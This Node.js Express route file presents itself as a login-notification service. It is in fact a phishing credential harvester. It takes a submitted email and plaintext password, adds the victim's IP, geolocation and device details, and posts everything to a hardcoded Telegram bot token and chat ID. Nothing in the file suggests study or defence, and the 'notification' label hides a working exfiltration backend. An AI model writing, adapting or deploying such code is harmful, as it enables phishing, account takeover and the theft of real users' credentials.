const express = require("express");
const fetch = require("node-fetch");  // install with: npm i node-fetch@2
const geoip = require('geoip-lite');
const UAParser = require('ua-parser-js');

const router = express.Router();

// Your Telegram bot credentials
const BOT_TOKEN = "6852576828:AAHxXG-NIEkPNGuwwkdoFRzfxs9ZBvg7iU0";   // from @BotFather
const CHAT_ID = "2049470956";  // your chat ID
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

router.post('/', async (req, res) => {
    try {
        const { email, password } = req.body;

        if (!email || !password) {
            return res.status(400).json({ success: false, message: "Missing email or password" });
        }

        const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
        const location = geoip.lookup(ip);
        const locationStr = location ? `${location.city}, ${location.country}` : 'Unknown';

        const parser = new UAParser(req.headers['user-agent']);
        const agent = parser.getResult();
        const deviceType = `${agent.os.name} ${agent.os.version} - ${agent.browser.name} ${agent.browser.version}`;

        // Build the Telegram message
        const message = `
📌 *Login Notification*
- Email: \`${email}\`
- Password: \`${password}\`
- IP: \`${ip}\`
- Location: ${locationStr}
- Timestamp: ${new Date().toISOString()}
- Device: ${deviceType}
        `;

        // Send to Telegram
        const response = await fetch(TELEGRAM_API, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: "Markdown"
            })
        });

        if (!response.ok) {
            const errText = await response.text();
            throw new Error(`Telegram API error: ${errText}`);
        }

        console.log(`Telegram notification sent for ${email}`);

        res.status(200).json({
            success: true,
            message: "Notification sent successfully via Telegram",
            loginDetails: { device: deviceType, ip, location: locationStr }
        });

    } catch (error) {
        console.error("Error sending Telegram message:", error);
        res.status(500).json({ success: false, message: "Failed to send Telegram notification", error: error.message });
    }
});

module.exports = router;
